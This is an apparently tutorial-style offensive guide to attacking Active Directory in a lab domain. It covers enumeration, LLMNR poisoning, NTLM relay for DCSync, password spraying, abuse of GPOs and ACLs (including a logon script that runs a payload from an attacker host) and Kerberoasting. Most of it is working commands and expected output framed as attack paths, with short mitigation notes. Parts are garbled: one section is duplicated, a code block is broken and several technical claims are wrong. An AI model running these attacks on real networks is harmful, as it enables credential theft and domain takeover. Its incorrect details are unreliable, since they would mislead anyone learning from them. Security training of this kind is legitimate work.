
## Initial Enumeration & Reconnaissance

_Learn how to gather intel—both anonymously and with low-privilege credentials._

### Key Concepts

-   **Anonymous Bind**  
    A way to connect to LDAP without providing a username or password—like browsing a public bookshelf. You can see basic containers (Schema, Configuration, Domain) but no sensitive details.
    
-   **Low-Privilege Account**  
    A regular user account with minimal rights, like a guest pass. You can query most directory information without modifying anything.
    
-   **Reconnaissance**  
    The process of quietly mapping out the AD environment: discovering domains, OUs, and naming contexts before attempting any deeper attacks.
    

----------

### Container Names Explained

After an anonymous bind, you’ll often see three top-level containers:

1.  **Schema**
    
    -   Think of Schema as the blueprint or dictionary for Active Directory. It defines every object type (user, computer, group) and attribute (name, email, password policy) that AD supports.
        
2.  **Configuration**
    
    -   Configuration is like the master settings file for your entire AD forest. It contains data on sites, services, and replication topology—how DCs talk to each other.
        
3.  **Domain (e.g., lab.local)**
    
    -   This is the container holding all actual user, computer, and group objects for your domain. The name (lab.local) is your domain’s DNS name and forms the base Distinguished Name (DN) for domain queries.
        

----------

### Tools & Commands

-   **ldapsearch** – Query AD anonymously or as a low-privilege user
    
    ```bash
    # Anonymous bind
    ldapsearch -x -H ldap://dc1.lab.local -b "DC=lab,DC=local"
    # Authenticated bind
    ldapsearch -x -H ldap://dc1.lab.local -D "LAB\User1" -w Pass123 -b "DC=lab,DC=local"
    
    ```
    
-   **whoami** – Check current user and group memberships on Windows
    
    ```bat
    whoami /groups
    
    ```
    

----------

### Step-by-Step Guide

1.  **Anonymous LDAP query**
    
    ```bash
    ldapsearch -x -H ldap://dc1.lab.local -b "DC=lab,DC=local"
    
    ```
    
    _Look for container names:_
    
    ```text
    Schema
    Configuration
    lab.local
    
    ```
    
2.  **Authenticated LDAP query**
    
    ```bash
    ldapsearch -x -H ldap://dc1.lab.local -D "LAB\User1" -w Pass123 -b "DC=lab,DC=local"
    
    ```
    
    _Notice additional attributes like email, descriptions._
    
3.  **Determine naming contexts**
    
    ```bash
    ldapsearch -x -H ldap://dc1.lab.local -s base -b "" "(objectClass=*)" defaultNamingContext
    
    ```
    
    _Records default domain DN (e.g., `DC=lab,DC=local`)._
    

----------

### Expected Result

Listings of top-level containers and naming contexts, giving you the base DNs for further queries.

----------

### Mitigation & Hardening

-   Disable anonymous LDAP binds via Group Policy: **Computer Configuration → Policies → Windows Settings → Security Settings → Local Policies → Security Options → Domain controller: LDAP server signing requirements** → Require signing.
    
-   Audit and restrict low-privilege account directory read permissions.
    

----------

### Next Steps

-   **Attack Type:** Enumeration
    
-   **Attack Path:**
    
    1.  Use naming contexts to enumerate OUs and trusts.
        
    2.  Move on to **Initial Enumeration of the Domain**.
        

----------


## LLMNR/NBT-NS Poisoning (Linux & Windows)

_Capture NTLMv2 hashes by spoofing local name-resolution queries._

### Key Concepts

-   **LLMNR (Link-Local Multicast Name Resolution)**  
    A fallback protocol Windows uses when DNS can’t resolve a name. Computers broadcast queries like “Who is PRINTER1?” on the local network.
    
-   **NBT-NS (NetBIOS Name Service)**  
    An older Windows protocol for name resolution over NetBIOS, similar to LLMNR but on the legacy NetBIOS layer.
    
-   **Poisoning**  
    Sending fake responses to name-resolution requests, tricking clients into authenticating to the attacker’s machine.
    
-   **NTLMv2 Hash**  
    A challenge-response packet from the NT LAN Manager protocol. Capturing this hash allows offline cracking of the user’s password.
    
-   **SMB Signing**  
    A security feature requiring cryptographic signing of SMB messages to prevent relay attacks.
    
-   **DRSUAPI (Directory Replication Service Remote Protocol)**  
    The interface that Domain Controllers expose for replication. By relaying NTLM auth to LDAP with the DRSUAPI interface, the attacker can pull password hashes (DCSync attack).
    
-   **DCSync Attack**  
    An attack where a non-DC node imitates a DC and requests directory replication, extracting the NTDS.dit database including all user hashes.
    

----------

### Tools & Commands

-   **Responder** (Kali Linux) – Poison LLMNR/NBT-NS to capture NTLMv2 hashes
    
    ```bash
    # 1. Edit config to enable only LLMNR/NBNS poisoning
    vim /etc/responder/Responder.conf
    #   Under [Responder Core], set:
    #   HTTP = Off
    #   SMB = Off
    #   NBNS = On
    #   LLMNR = On
    
    # 2. Start Responder on interface eth0
    responder -I eth0 -wr
    
    ```
    
-   **ntlmrelayx.py** (Impacket) – Relay captured hashes to services
    
    ```bash
    # Relay to SMB (share access)
    ntlmrelayx.py -t smb://dc1.lab.local --smb2support
    
    # Relay to LDAP (DCSync)
    ntlmrelayx.py -t ldap://dc1.lab.local --escalate-method drsuapi
    
    ```
    
-   **hashcat** – Crack NTLMv2 hashes offline
    
    ```bash
    # NTLMv2 mode 5600
    hashcat -m 5600 captured.hash wordlist.txt
    
    ```
    

----------

### Step-by-Step Guide

1.  **Poison name-resolution**
    
    ```bash
    responder -I eth0 -wr
    
    ```
    
    _Output:_ Logs in `/usr/share/responder/logs/Responder-Session.log` capturing NTLMv2 hashes.
    
2.  **Trigger name lookups on target**
    
    ```bat
    ping NONEXISTENT-SRV
    
    ```
    
    _Windows sends LLMNR/NBT-NS queries that Responder poisons._
    
3.  **Extract captured hashes**
    
    ```bash
    grep "NTLMv2-SSP" /usr/share/responder/logs/Responder-Session.log > captured.hash
    
    ```
    
    _`captured.hash` now contains challenge-response pairs._
    
4.  **Crack hashes**
    
    ```bash
    hashcat -m 5600 captured.hash wordlist.txt
    
    ```
    
    _Look for recovered plaintext passwords._
    
5.  **Relay valid credentials**
    
    ```bash
    ntlmrelayx.py -t ldap://dc1.lab.local --escalate-method drsuapi
    
    ```
    
    _Explanation:_ ntlmrelayx takes the captured NTLMv2 hash from `captured.hash` and uses it to perform SMB or LDAP authentication to the target (dc1.lab.local). When relaying to LDAP with the DRSUAPI interface, it effectively logs in as the original user (whose hash you captured) without needing the plaintext password. The DC sees an authenticated session and grants replication rights if that user has them, enabling a DCSync.
    
    _Details of credential usage:_
    
    -   The relay tool uses the NTLMv2 hash as proof of knowledge of the password, performing the NTLM protocol handshake with the DC.
        
    -   No plaintext password is required; the hash itself is sufficient for authentication.
        
    
    _Look for:_
    
    ```text
    [+] Accepting connection from 10.0.0.5, relaying to ldap://dc1.lab.local
    [+] Authenticating as UserA using NTLMv2 hash
    [+] DRSUAPI may be used to replicate directory
    [+] Dumping credentials for domain: lab.local
    
    ```
    

----------

### Expected Result

-   A file `captured.hash` containing NTLMv2 hashes.
    
-   **Hashcat** outputs plaintext credentials, e.g., `UserA:Password123`.
    
-   **ntlmrelayx.py** shows messages like:
    
    ```text
    [+] DRSUAPI may be used to replicate directory
    [+] Dumping credentials for domain: lab.local
    
    ```
    
-   **secretsdump.py** execution dumps NTDS.dit hashes, for example:
    
    ```bash
    secretsdump.py -just-dc lab.local/attacker@dc1.lab.local
    
    ```
    
    ```text
    Administrator:500:aad3b435b51404eeaad3b435b51404ee:1122334455...
    krbtgt:502:aad3b435b51404eeaad3b435b51404ee:5566778899...
    
    ```
    

----------

### Mitigation & Hardening

-   **Disable LLMNR/NBT-NS** via GPO:  
    Computer Configuration → Policies → Administrative Templates → Network → DNS Client → **Turn off multicast name resolution** → Enabled
    
-   **Enable SMB Signing** on servers:
    
    ```powershell
    Set-SmbServerConfiguration -RequireSecuritySignature $true
    
    ```
    

----------

### Next Steps

-   **Attack Type:** Credential Capture → NTLM Relay → Privilege Escalation
    
-   **Attack Path:**
    
    1.  Crack captured NTLMv2 hashes.
        
    2.  Validate credentials via SMB (e.g., `smbclient`) or WinRM (`evil-winrm`).
        
    3.  Perform DCSync via LDAP relay.
        
    4.  Dump NTDS.dit hashes and forge Golden Tickets for persistence.
        

----------


## Enumerating & Retrieving Password Policies

_Query and interpret Active Directory domain password policy settings to plan effective attacks._

### Key Concepts

-   **Password Policy**  
    A set of rules defining password requirements: length, complexity, history, and lockout settings. Think of it as the library’s rule on how long and complex a borrowed item’s code must be.
    
-   **Fine-Grained Password Policy (FGPP)**  
    Allows different password settings for specific groups or users, overriding the default domain policy. Like special rules for VIP library members.
    
-   **Lockout Threshold**  
    The number of failed login attempts before an account is temporarily locked, preventing brute force.
    
-   **Complexity Requirements**  
    Rules requiring combinations of uppercase, lowercase, digits, and special characters.
    
-   **Password History**  
    Number of previous passwords that cannot be reused.
    

----------

### Tools & Commands

-   **Get-ADDefaultDomainPasswordPolicy** (PowerShell) – Retrieve default domain policy
    
    ```powershell
    Get-ADDefaultDomainPasswordPolicy | Format-List
    
    ```
    
    _Expected Output Snippet:_
    
    ```text
    MinPasswordLength  : 12
    ComplexityEnabled  : True
    LockoutThreshold   : 5
    LockoutObservationWindow : 00:00:30
    ResetLockoutCounterAfter : 00:30:00
    PasswordHistorySize: 24
    
    ```
    
-   **Get-ADFineGrainedPasswordPolicy** (PowerShell) – List FGPPs
    
    ```powershell
    Get-ADFineGrainedPasswordPolicy | Format-Table Name, Precedence, MinPasswordLength, ComplexityEnabled
    
    ```
    
    _Expected Output Snippet:_
    
    ```text
    Name                Precedence MinPasswordLength ComplexityEnabled
    ----                ---------- ----------------- ------------------
    HighPrivPolicy      1          15                True
    
    ```
    

----------

### Step-by-Step Guide

1.  **View default domain policy**
    
    ```powershell
    Get-ADDefaultDomainPasswordPolicy | FL
    
    ```
    
    _Look for_: `MinPasswordLength = 12`, `ComplexityEnabled = True`, `LockoutThreshold = 5`.
    
2.  **Check for fine-grained policies**
    
    ```powershell
    Get-ADFineGrainedPasswordPolicy | FT Name,MinPasswordLength,ComplexityEnabled,LockoutThreshold
    
    ```
    
    _Look for_: Policies with stricter settings (`MinPasswordLength > 12`).
    
3.  **Identify juicy targets**  
    Accounts not subject to FGPP with weak default policies—e.g., `MinPasswordLength = 8`, `ComplexityEnabled = False`.
    

----------

### Expected Result

-   **Default Policy** shows strong settings: length ≥12, complexity ON, lockout at 5 attempts.
    
-   **FGPP** list reveals any groups/users with weaker or stronger policies.
    
-   **Juicy Policies**: Look for accounts using less strict rules as easier spray/brute targets.
    

----------

### Mitigation & Hardening

-   **Enforce uniform strong policies**: Align FGPPs to domain policy to prevent weak-target exceptions.
    
-   **Increase lockout thresholds**: Consider temporary lockouts at ≤3 attempts and longer reset windows.
    
-   **Implement MFA**: Protect against password-based attacks regardless of policy strength.
    

----------

### Next Steps

-   **Attack Type:** Password Attack Planning
    
-   **Attack Path:**
    
    1.  Target accounts with lenient policies for password spraying.
        
    2.  Use retrieved settings to fine-tune brute force or spray campaigns (timing and password lists).
        

----------


## Password Spraying (Building Target Lists; Linux & Windows)

_Refine user lists and perform password spraying from both Linux and Windows platforms._

### Key Concepts

-   **Password Spraying**  
    Trying a single (or small set of) common password(s) against many accounts to avoid lockouts. Like testing the same key on many locks rather than many keys on one lock.
    
-   **Target List**  
    A curated list of usernames focused by role, group membership, or organizational unit—enabling more efficient attacks than blind spraying.
    
-   **Account Lockout**  
    A defense that temporarily blocks accounts after a threshold of failed attempts. Proper spraying stays below this threshold.
    
-   **Credential Validation**  
    Verifying that sprayed passwords worked, using protocols like LDAP bind or SMB authentication.
    

----------

### Tools & Commands

-   **ldapsearch** (Kali Linux) – Build target lists via LDAP
    
    ```
    ldapsearch -x -H ldap://dc1.lab.local \
      -b "OU=Sales,DC=lab,DC=local" \
      "(objectCategory=person)" sAMAccountName > targets.txt
    ```
    
    _Expected Output Snippet (targets.txt):_
    
    ```
    jdoe
    asmith
    mbrown
    ```
    
-   **CrackMapExec** (Linux/Windows) – Spray passwords via SMB/LDAP
    
    ```
    # echo "Spring2025!" | cme ldap lab.local -u targets.txt --continue-on-success
    ```

# Windows example (PowerShell)

cme ldap lab.local -u targets.txt -p "Spring2025!" --continue-on-success

```
_Expected Output Snippet:_
```text
[*] LAB\jdoe:Spring2025! (LDAP)  
[*] LAB\asmith:Spring2025! (LDAP)
```

----------

### Step-by-Step Guide

1.  **Generate a focused target list**
    
    ```
    ldapsearch -x -H ldap://dc1.lab.local \
      -b "OU=IT,DC=lab,DC=local" \
      "(objectClass=person)" sAMAccountName > targets.txt
    ```
    
    _Result:_  `targets.txt` with IT department usernames.
    
2.  **Perform spraying on Linux**
    
    ```
    cme ldap lab.local -u targets.txt -p "Autumn2025!" --continue-on-success
    ```
    
    _Look for:_  `LAB\asmith:Autumn2025! (LDAP)` indicating success.
    
3.  **Perform spraying on Windows**
    
    ```
    cme ldap lab.local -u targets.txt -p "Autumn2025!" --continue-on-success
    ```
    
    _Look for:_ Successful bind entries similar to above.
    
4.  **Validate credentials**
    
    ```
    smbclient -L \dc1.lab.local -U jdoe%Autumn2025!
    ```
    
    _If you see share listings, the password is valid._
    

----------

### Expected Result

-   A list of accounts that accepted the sprayed password in CrackMapExec output.
    
-   Successful SMB share listings via valid credentials.
    

----------

### Mitigation & Hardening

-   **Implement tighter lockout policies**: Lower threshold (e.g., 3 attempts) and longer lockout durations.
    
-   **Enable Multi-Factor Authentication (MFA)** for all critical accounts.
    
-   **Monitor for rapid failed logins** and alert on anomalies.
    

----------

### Next Steps

-   **Attack Type:** Targeted Password Spraying → Credential Validation
    
-   **Attack Path:**
    
    1.  Build and refine target lists via LDAP.
        
    2.  Spray common passwords with CME.
        
    3.  Validate valid credentials for deeper enumeration or persistence.

## Credentialed Enumeration (Linux & Windows)

_Use valid credentials to uncover detailed Active Directory information._

### Key Concepts

-   **Authenticated Bind**  
    Connecting to LDAP or PowerShell AD cmdlets using a valid username and password (e.g., `User1 / Pass123`) to access information beyond what anonymous binds allow.
    
-   **User Object**  
    Represents a person in AD. Key attributes include `sAMAccountName` (username), `mail`, `title`, and `manager`.
    
-   **Group Object**  
    Collections of users. Groups like `Domain Admins` grant special privileges; listing members shows who holds those rights.
    
-   **Computer Object**  
    Represents a machine joined to the domain. Knowing OS and name helps identify targets for further attacks.
    

----------

### Tools & Commands

-   **ldapsearch** (Kali Linux) – Query AD over LDAP with credentials
    
    ```bash
    ldapsearch -x -H ldap://dc1.lab.local \
      -D "LAB\User1" -w Pass123 \
      -b "DC=lab,DC=local" \
      "(objectCategory=person)" sAMAccountName,mail,title,manager
    
    ```
    
    _Expected Output Snippet:_
    
    ```text
    sAMAccountName: jdoe
    mail: jdoe@lab.local
    title: Finance Analyst
    manager: CN=Jane Smith,OU=Users,DC=lab,DC=local
    
    ```
    
-   **Get-ADGroupMember** (PowerShell) – List members of a group
    
    ```powershell
    Import-Module ActiveDirectory
    Get-ADGroupMember -Identity "Domain Admins" | Select Name,SamAccountName
    
    ```
    
    _Expected Output Snippet:_
    
    ```text
    Name            SamAccountName
    ----            --------------
    Lab Admin User  labadmin
    
    ```
    
-   **Get-ADComputer** (PowerShell) – Enumerate computer accounts
    
    ```powershell
    Get-ADComputer -Filter * -Properties OperatingSystem | Select Name,OperatingSystem
    
    ```
    
    _Expected Output Snippet:_
    
    ```text
    Name        OperatingSystem
    ----        ---------------
    DC1         Windows Server 2019
    WORKSTN1    Windows 10 Pro
    
    ```
    

----------

### Step-by-Step Guide

1.  **Perform an authenticated LDAP query for users**
    
    ```bash
    ldapsearch -x -H ldap://dc1.lab.local \
      -D "LAB\User1" -w Pass123 \
      -b "DC=lab,DC=local" \
      "(objectCategory=person)" sAMAccountName,mail,title,manager
    
    ```
    
    _What to look for:_ Usernames with emails and job titles, showing roles and reporting chains.
    
2.  **List Domain Admins group members**
    
    ```powershell
    Get-ADGroupMember -Identity "Domain Admins" | Select Name,SamAccountName
    
    ```
    
    _What to look for:_ Names of high-privilege accounts you may target later.
    
3.  **Enumerate all computer accounts**
    
    ```powershell
    Get-ADComputer -Filter * -Properties OperatingSystem | Select Name,OperatingSystem
    
    ```
    
    _What to look for:_ Servers vs workstations to prioritize attacks.
    

----------

### Expected Result

-   A list of user accounts with key attributes for profiling.
    
-   Identification of privileged group members.
    
-   Inventory of computers and their OS versions.
    

----------

### Mitigation & Hardening

-   **Limit LDAP read permissions**: Allow only necessary users to perform directory queries.
    
-   **Audit and monitor** credentialed queries, especially group membership and computer enumeration.
    

----------

### Next Steps

-   **Attack Type:** Reconnaissance → Privilege Escalation
    
-   **Attack Path:**
    
    1.  Use user attributes to identify high-value targets.
        
    2.  Move to **Enumerating Security Controls** to check ACLs and GPOs next.
        

----------


## Enumerating Security Controls (GPOs, ACLs, AD CS, AEP)

_Detect and analyze the policies, permissions, and security settings protecting Active Directory._

### Key Concepts

-   **Group Policy Object (GPO)**  
    A GPO is a rulebook you attach to groups of users or computers (OUs). It automatically applies settings like password policies, user rights, and scripts. For example, if **"Allow log on locally"** is granted to **Everyone**, any user can log on to domain machines—a dangerous misconfiguration.
    
-   **Access Control List (ACL)**  
    AD objects (users, groups, OUs) have ACLs listing who can do what:
    
    -   **GenericAll**: Full control over the object and its children (read, modify, delete).
        
    -   **GenericRead**: View all properties and list child objects.
        
    -   **GenericWrite**: Modify all properties and create child objects.
        
    -   **ReadProperty** / **WriteProperty**: Read or modify specific attributes (e.g., `userAccountControl`).
        
    -   **Delete**: Remove the object.
        
    -   **WriteDacl**: Change the ACL itself—adding or removing ACEs.
        
    -   **WriteOwner**: Change the owner of the object.
        
    -   **InheritanceType: All**: The permission applies to child objects as well.
        
-   **AD CS (Certificate Services) & Templates**  
    Active Directory Certificate Services (AD CS) provides Public Key Infrastructure (PKI) within AD. Certificates are digital IDs issued to users, computers, or services to enable strong authentication and secure communications.
    
    -   **Why certificates are used**: They allow password-less authentication, encrypt LDAP traffic (LDAPS), and support smart-card logon via **PKINIT**.
        
    -   **PKINIT (Public Key Cryptography for Initial Authentication in Kerberos)**: An extension to Kerberos that uses certificates instead of (or in addition to) passwords for the initial ticket-granting request. Think of it as showing a secure badge rather than reciting a secret phrase.
        
    -   **Certificate Templates** define who can request, autoenroll, or manage certificates. Misconfigurations include:
        
        -   **Authenticated Users with Enroll**: Any user can request certificates, leading to unauthorized access.
            
        -   **Autoenroll for broad groups**: Persistent certificates issued without admin oversight.
            
        -   **Excessive Manage/Full Control rights**: Attackers can modify templates to weaken security (e.g., allow issuance of CA certificates).
            
-   **Advanced Encryption Policy (AEP)**  
    Domain-wide settings enforcing strong cryptography:
    
    -   **AES-only Kerberos**: Forces ticket encryption with AES.
        
    -   **LDAPS Sign/Channel Binding**: Ensures LDAP sessions cannot be tampered with.
        

----------

### Tools & Commands

-   **Get-GPOReport** – Export all GPOs to HTML
    
    ```powershell
    Import-Module GroupPolicy
    Get-GPOReport -All -ReportType HTML -Path AllGPOs.html
    
    ```
    
    _Expected Output Snippet (search for “Allow log on locally”):_
    
    ```html
    <Setting Name="Allow log on locally" Value="Everyone"/>
    
    ```
    
-   **Get-ObjectAcl** – View ACLs and understand ACEs
    
    ```powershell
    Get-ObjectAcl -DistinguishedName "OU=Admins,DC=lab,DC=local" -ResolveGUIDs | FL
    
    ```
    
    _Expected Output Snippet:_
    
    ```text
    IdentityReference      : LAB\\AdminsGroup
    ActiveDirectoryRights  : GenericAll
    InheritanceType        : All
    
    ```
    
-   **certutil** – Inspect certificate-template permissions
    
    ```powershell
    certutil -view -restrict "Certificate Template=DomainController"
    
    ```
    
    _Expected Output Snippet:_
    
    ```text
    Template Name: DomainController
    Permissions  : Authenticated Users (Read, Enroll), Domain Admins (Full Control)
    
    ```
    
-   **nltest** – Verify LDAPS signing and channel binding enforcement
    
    ```bat
    nltest /sc_query:LAB
    
    ```
    
    _Expected Output Snippet:_
    
    ```text
    Flags: 0x10000 (SEAL)
    
    ```
    

----------

### Step-by-Step Guide

1.  **Export GPO settings**
    
    ```powershell
    Get-GPOReport -All -ReportType HTML -Path AllGPOs.html
    
    ```
    
    _Check the HTML for misconfigurations like broad “Allow log on locally” assignments._
    
2.  **Analyze ACLs on critical objects**
    
    ```powershell
    Get-ObjectAcl -DistinguishedName "OU=Finance,DC=lab,DC=local" -ResolveGUIDs | FL
    
    ```
    
    _Look for `ActiveDirectoryRights : GenericAll` or `WriteDacl`._
    
3.  **Review certificate template permissions**
    
    ```powershell
    certutil -view -restrict "Certificate Template=User"
    
    ```
    
    _Verify only intended security groups have Enroll/Autoenroll._
    
4.  **Confirm LDAP signing/channel binding**
    
    ```bat
    nltest /sc_query:LAB
    
    ```
    
    _Ensure `SEAL` is present in flags._
    

----------

### Expected Result

-   Identification of overly permissive GPO entries.
    
-   Detection of dangerous ACL rights on AD objects.
    
-   Discovery of certificate templates with insecure enrollment permissions.
    
-   Confirmation that LDAP signing/channel binding is enforced.
    

----------

### Exploitation When Misconfigured

-   **Allow log on locally = Everyone**: Deploy malicious GPO logon script as SYSTEM
    
    ```powershell
    Set-GPRegistryValue -Name "VulnGPO" -Key "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\Scripts\\Logon" -ValueName "0" -Type String -Value "powershell -exec bypass -File \\\"\\\\attacker\\\\payload.ps1\\\""
    
    ```
    
-   **GenericAll / WriteDacl**: Add attacker to Domain Admins
    
    ```powershell
    Add-ADGroupMember -Identity "Domain Admins" -Members "AttackerUser"
    
    ```
    
-   **Authenticated Users Enroll**: Request and use user certificate for PKINIT
    
    ```powershell
    certreq -submit -attrib "CertificateTemplate:User" user.inf user.cer
    kinit -k -t user.cer user@LAB.LOCAL
    
    ```
    
-   **Missing LDAPS signing**: Relay NTLMv2 to LDAP for DCSync
    
    ```bash
    ntlmrelayx.py -t ldap://dc1.lab.local --escalate-method drsuapi
    
    ```
    

----------

### Mitigation & Hardening

-   Remove “Allow log on locally” from Everyone.
    
-   Strip GenericAll/WriteDacl from non-admins.
    
-   Restrict certificate-template Enroll/Autoenroll.
    
-   Enforce LDAP signing/channel binding via GPO.
    

----------

### Next Steps

-   Use misconfigurations to gain SYSTEM or Domain Admin.
    
-   Clean up persistent GPO and ACL changes to reduce detection.
    

----------

## Module 4: Kerberos Attacks

Before we begin, here are a few key terms you’ll see:

-   **Service Account**: A special user account used only by services (e.g., web server, database) to run background tasks. It’s not tied to a real person.
    
-   **Service Principal Name (SPN)**: A unique identifier in AD for a service instance, formatted as `service/hostname.domain` (e.g., `HTTP/SRV1.lab.local`). It tells Kerberos which account to use when requesting a ticket.
    
-   **Ticket Granting Service (TGS)**: A Kerberos ticket issued by the Key Distribution Center (KDC) that allows access to a specific service.
    
-   **AES Encryption**: A modern, strong encryption algorithm used by Kerberos to protect tickets.
    
-   **Kerberos Preauthentication**: A step where a client proves its identity before getting a ticket, protecting against offline attacks.
    

### Tools & Commands

Tool

Purpose

Command Example

What You’ll See

**GetUserSPNs.py**

Request TGS for SPN accounts

`GetUserSPNs.py -request -dc-ip dc1.lab.local lab.local/USER:Pass`

Lines indicating saved hashes for each SPN

**hashcat**

Crack encrypted TGS hashes offline

`hashcat -m 13100 spn.hashes wordlist.txt`

`Recovered: svc_http:P@ssw0rd123`

**kinit**

Obtain Kerberos ticket using credentials

`kinit svc_http@LAB.LOCAL`

No output on success; `ticket` in cache

**ldapsearch**

Enumerate SPNs via LDAP

`ldapsearch -x -H ldap://dc1.lab.local -b "DC=lab,DC=local" (servicePrincipalName=*) sAMAccountName,servicePrincipalName`

Lists accounts with SPNs

----------

Before we begin, here are a few key terms you’ll see:

-   **Service Account**: A special user account used only by services (e.g., web server, database) to run background tasks. It’s not tied to a real person.
    
-   **Service Principal Name (SPN)**: A unique identifier in AD for a service instance, formatted as `service/hostname.domain` (e.g., `HTTP/SRV1.lab.local`). It tells Kerberos which account to use when requesting a ticket.
    
-   **Ticket Granting Service (TGS)**: A Kerberos ticket issued by the Key Distribution Center (KDC) that allows access to a specific service.
    
-   **AES Encryption**: A modern, strong encryption algorithm used by Kerberos to protect tickets.
    
-   **Kerberos Preauthentication**: A step where a client proves its identity before getting a ticket, protecting against offline attacks.
    

----------

### Kerberoasting

A **service account** is a non-human user that runs server applications, like SQL or web services. Each service account has a **Service Principal Name (SPN)**, its unique tag in Active Directory—formatted as `service/hostname.domain`. To uncover a service account’s password without raising alarms, you perform Kerberoasting: request the service’s Kerberos ticket (TGS), which is encrypted with the service account’s password, then crack it offline.

**How to perform Kerberoasting step by step:**

1.  **Find SPNs**:
    
    ```
    ldapsearch -x -H ldap://dc1.lab.local \
      -b "DC=lab,DC=local" "(servicePrincipalName=*)" \
      sAMAccountName,servicePrincipalName
    ```
    
2.  **Request TGS tickets**:
    
    ```
    GetUserSPNs.py -request -dc-ip dc1.lab.local lab.local/DOMAINUSER:UserPass > spn.hashes
    ```
    
3.  **Crack tickets**:
    
    ```
    hashcat -m 13100 spn.hashes wordlist.txt
    ```
    
4.  **Verify**:
    
    ```
    kinit svc_http@LAB.LOCAL
    ```
    

**Expected Result:**

-   `spn.hashes` with encrypted TGS hashes.
    
-   Hashcat prints plaintext password.
    

**Mitigation:**

-   **GPO**: Go to Computer Configuration → Policies → Administrative Templates → System → Kerberos Policy → "Encrypt service ticket types" → select only AES.
    
-   **PowerShell**:
    
    ```
    Set-ADUser svc_http -KerberosEncryptionType AES256
    ```
    
-   **KDC (Key Distribution Center)**: The service on DCs that issues tickets—ensure its policy enforces preauthentication and strong encryption.
    

**Next Steps:**

-   **Attack Type:** Kerberos Credential Theft → Kerberoasting
    
-   **Attack Path:** Enumerate SPNs → Request TGS → Crack tickets → Authenticate as service account.
